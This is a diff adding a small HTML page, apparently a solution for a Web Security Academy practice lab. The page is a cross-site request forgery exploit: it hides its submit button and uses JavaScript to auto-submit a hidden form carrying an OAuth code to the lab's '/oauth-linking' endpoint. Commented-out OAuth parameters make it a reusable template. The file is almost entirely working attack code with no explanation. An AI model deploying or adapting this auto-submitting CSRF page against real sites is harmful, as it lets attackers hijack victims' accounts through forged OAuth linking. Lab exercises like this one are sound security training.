@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirectiing</title>
+  <!-- Hide our submit button -->
+    <style>
+    #submit-btn {
+      display: none;
+    }
+    </style>
+</head>
+<body>
+
+  <!-- CSRF GET payload -->
+    <form method="GET" action="https://0a900000040c7149c0ef0b1d00cb00b7.web-security-academy.net/oauth-linking?" id="myForm">
+
+
+    <!-- For additional URL parameters, we can use the following example -->
+
+    <input type="hidden" name="code" value="jgnv17fS3w4Hx96uKzPeTqlGtaciMgnQZDU8c66xtpS">
+   
+                            <!-- Additional Examples -->
+                            <!-- <input type="hidden" name="client_id" value="tjx3qqahjcpcir1y7bcpd"> -->
+                            <!-- <input type="hidden" name="redirect_uri" value="https://0a900000040c7149c0ef0b1d00cb00b7.web-security-academy.net/oauth-login"> -->
+                            <!-- <input type="hidden" name="response_type" value="code"> -->
+                            <!-- <input type="hidden" name="scope" value="openid profile email"> -->
+
+
+
+    <input type="submit" value="Submit" id="submit-btn">
+        <script>
+        // Javascript to auto submit
+          window.onload = function() {
+            document.getElementById('myForm').submit();
+          };
+        </script>
+</body>
+</html>
